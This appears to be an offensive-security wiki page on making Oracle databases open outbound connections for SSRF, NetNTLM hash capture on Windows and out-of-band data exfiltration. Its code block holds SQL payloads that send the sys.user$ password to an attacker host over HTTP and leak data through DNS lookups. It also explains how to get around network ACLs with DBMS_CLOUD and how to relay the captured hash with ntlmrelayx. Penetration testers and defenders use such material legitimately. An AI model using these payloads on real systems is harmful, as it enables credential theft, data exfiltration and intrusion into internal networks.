---
title: "Oracle out-of-band: SSRF, hash capture, and exfiltration"
description: "Making Oracle open outbound connections through UTL_HTTP, UTL_TCP, and DBMS_LDAP for server-side request forgery, capturing the service account's NTLM over a UNC or HTTP callback on Windows, and exfiltrating data out of band when direct output is blind."
keywords:
  - UTL_HTTP
  - UTL_TCP
  - DBMS_LDAP
  - Oracle SSRF
  - out-of-band
---

# Oracle out-of-band

Oracle can be made to **initiate outbound connections**, which turns a database session (or a blind injection) into **server-side request forgery**, a **credential-capture** primitive on Windows, and an **exfiltration** channel when you cannot read query output directly. The outbound is made by the Oracle service account, so it reaches internal services the attacker cannot.

## Outbound packages

```sql
-- HTTP callout: SSRF to internal services, or exfiltrate data in the URL
SELECT UTL_HTTP.REQUEST('http://<attacker>/'||(SELECT password FROM sys.user$ WHERE rownum=1)) FROM dual;

-- raw TCP to an internal host/port (service reach and banner grab)
-- UTL_TCP.OPEN_CONNECTION(host, port) ...

-- LDAP bind to an attacker or internal directory
-- DBMS_LDAP.INIT('<host>', 389) ...

-- DNS-based blind exfiltration and interaction
SELECT UTL_INADDR.GET_HOST_ADDRESS('<data>.<attacker-dns>') FROM dual;
```

## Hash capture on Windows

Where Oracle runs on Windows, pointing an outbound at a **UNC path or an SMB/HTTP listener** makes the service account authenticate, handing you its NetNTLM to [capture](../../directory/active-directory/authentication/ntlm/net-ntlm-capture-and-poisoning.md) or [relay](../../directory/active-directory/authentication/ntlm/relay.md), exactly as with the MSSQL coercion primitive.

## Exploitation notes

- Since 11g the network packages are gated by **network ACLs** (`DBMS_NETWORK_ACL_ADMIN`); where they block `UTL_HTTP`/`UTL_TCP`, `DBMS_CLOUD.SEND_REQUEST` (19c/23c) often still reaches out over HTTPS.
- **SSRF** from the database reaches cloud metadata endpoints and internal-only services, which is high value in cloud-hosted Oracle.
- **Out-of-band exfiltration** (DNS or HTTP) is the way to extract data from a **blind** injection where no row is returned to you.
- On Windows, the hash-capture angle makes Oracle an Active Directory relay source, not just a data target, so pair it with `ntlmrelayx`.

## Tools

- **sqlplus / injection point**: issue the `UTL_HTTP`/`UTL_TCP`/`DBMS_LDAP`/`UTL_INADDR` calls.
- **Responder / ntlmrelayx.py**: capture or relay the coerced service-account authentication on Windows.
- **Burp Collaborator / interactsh**: detect the out-of-band HTTP and DNS interactions.

## References

- [HackTricks: Oracle injection, out-of-band](https://hacktricks.wiki/en/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/index.html)
- [ibreak.software: using SQL injection to perform SSRF/XSPA attacks](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)
- [Oracle: UTL_HTTP package](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html)
